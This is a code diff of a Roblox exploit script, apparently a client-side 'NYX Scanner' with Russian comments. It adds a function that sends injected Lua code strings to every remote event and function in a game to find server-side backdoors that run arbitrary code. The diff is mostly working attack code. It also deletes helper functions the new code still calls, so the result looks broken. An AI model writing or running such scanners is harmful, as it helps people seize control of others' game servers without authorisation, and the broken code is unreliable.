@@ -419,32 +419,70 @@ UIS.InputChanged:Connect(function(input)
     end
 end)
 
--- ============================================================================
--- ЛОГИКА
--- ============================================================================
-local player = game.Players.LocalPlayer
-local backdoor = nil
-local searching = false
-local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
-
-local function addLog(text)
-    G2L["logsBox"].Text = G2L["logsBox"].Text .. "[" .. os.date("%H:%M:%S") .. "] " .. text .. "\n"
-end
-
-local function notify(text)
-    pcall(function()
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "NYX Scanner",
-            Duration = 4,
-            Text = text
-        })
-    end)
-end
-
-local function generateName(len)
-    local t = ''
-    for i = 1, len do t = t .. alphabet[math.random(1, #alphabet)] end
-    return t
+-- Сканер бэкдоров (ИСПРАВЛЕН - НЕ ЗАВИСАЕТ)
+local function findRemote()
+    local startTime = os.clock()
+    local MAX_TIME = 20 -- Максимум 20 секунд на сканирование
+    local remotes = {}
+    
+    -- Собираем все ремоты
+    for _, remote in ipairs(game:GetDescendants()) do
+        if os.clock() - startTime > MAX_TIME then break end
+        
+        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
+            local fullName = remote:GetFullName()
+            if string.find(fullName, "RobloxReplicatedStorage") then continue end
+            if string.find(fullName, "__FUNCTION") then continue end
+            if string.find(fullName, "HDAdminClient") then continue end
+            if string.find(fullName, "DefaultChatSystemChatEvents") then continue end
+            if string.find(fullName, "Adonis") then continue end
+            if string.find(fullName, "Kohl") then continue end
+            
+            table.insert(remotes, remote)
+        end
+    end
+    
+    addLog("Testing " .. #remotes .. " remotes...")
+    
+    -- Тестируем каждый ремот
+    for _, remote in ipairs(remotes) do
+        if os.clock() - startTime > MAX_TIME then
+            addLog("Scan timeout")
+            break
+        end
+        
+        local code = generateName(math.random(12, 30))
+        
+        -- Отправляем команду
+        pcall(function()
+            if remote:IsA('RemoteEvent') then
+                remote:FireServer("a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+            else
+                remote:InvokeServer("a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
+            end
+        end)
+        
+        -- Ждём появления модели (максимум 2 секунды на каждый ремот)
+        local waitStart = os.clock()
+        local found = false
+        
+        repeat
+            if workspace:FindFirstChild(code) then
+                backdoor = remote
+                notify("Backdoor found! " .. remote:GetFullName())
+                addLog("Backdoor found: " .. remote:GetFullName())
+                found = true
+                break
+            end
+            wait(0.1)
+        until os.clock() - waitStart > 2
+        
+        if found then
+            return true
+        end
+    end
+    
+    return false
 end
 
 -- ============================================================================
